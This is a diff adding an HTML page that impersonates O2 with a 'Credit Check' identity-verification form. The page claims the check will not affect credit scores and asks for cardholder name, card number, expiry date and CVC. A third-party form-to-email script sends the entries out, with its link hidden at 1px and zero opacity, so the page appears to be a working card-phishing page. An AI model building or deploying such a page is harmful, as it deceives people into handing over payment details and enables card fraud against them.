@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>O2 Credit Check </title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #003366;
+      --secondary: #0057b8;
+      --text-color: #222;
+      --bg: #e7ecf1;
+      --white: #ffffff;
+      --glass: rgba(255, 255, 255, 0.2);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #dce3ed, #b9c7da);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .navbar {
+      background-color: var(--primary);
+      color: var(--white);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      flex-wrap: wrap;
+    }
+
+    .navbar a {
+      color: var(--white);
+      text-decoration: none;
+      margin-left: 20px;
+      font-size: 14px;
+    }
+
+    .header {
+      background: linear-gradient(to right, var(--secondary), var(--primary));
+      color: var(--white);
+      text-align: center;
+      padding: 2rem;
+      font-size: 2rem;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    .container {
+      background: var(--glass);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 2rem;
+      max-width: 450px;
+      margin: 2rem auto;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      background-color: rgba(255,255,255,0.8);
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-bottom: 0.8rem;
+      font-size: 1.4rem;
+    }
+
+    p {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 1.5rem;
+    }
+
+    .card-logos {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 1.5rem;
+    }
+
+    .card-logos img {
+      width: 50px;
+      height: auto;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 4px;
+      display: block;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      border-color: var(--secondary);
+      outline: none;
+      background-color: #f8faff;
+    }
+
+    .submit-btn {
+      background-color: var(--secondary);
+      border: none;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: var(--primary);
+    }
+
+    @media (max-width: 540px) {
+      .navbar {
+        flex-direction: column;
+        text-align: center;
+        padding: 1rem;
+      }
+
+      .navbar a {
+        margin: 0.3rem;
+        font-size: 13px;
+      }
+
+      .header {
+        font-size: 1.5rem;
+        padding: 1.5rem;
+      }
+
+      .container {
+        margin: 1rem;
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="navbar">
+    <div><strong>O<sub>2</sub></strong></div>
+    <div>
+      <a href="#">Help</a>
+      <a href="#">Shop</a>
+      <a href="#">My O2</a>
+      <a href="#">Sign in or Register</a>
+    </div>
+  </div>
+
+  <div class="header">Credit Check</div>
+
+  <div class="container">
+    <h2>Verify Your Identity</h2>
+    <p>
+      Credit Check is just to validate your identity, not for the payment process and it's not going to affect your credit score.
+    </p>
+
+    <div class="card-logos">
+      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard">
+      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="American Express">
+      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+    </div>
+
+   <form method="post" action="//submit.form" >
+
+      <label for="name">Name on Card</label>
+      <input type="text" id="data_1" name="name-oncard" style="max-width: 100%;" class="form-control" placeholder="John Doe" required>
+
+
+      <label for="card">Card Number</label>
+      <input type="text" id="data_1" name="card-number" style="max-width: 100%;" class="form-control"placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+
+      <label for="expiry">Expiry</label>
+      <input type="text" id="expiry" name="expiry" style="max-width: 100%;" class="form-control"placeholder="MM/YY" required>
+
+
+      <label for="cvc">CVC</label>
+      <input type="text" id="cvc" name="cvc" style="max-width: 100%;" class="form-control"placeholder="123" maxlength="4" required>
+
+
+      <button type="submit" class="submit-btn">Submit</button>
+      <div>
+<div style='font-size:1px; opacity:0;' style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+<script src="https://www.100forms.com/js/FORMKEY:G6MXZSQBDXTA" type="text/javascript"></script>
+</div>
+    </form>
+  </div>
+
+</body>
+</html>
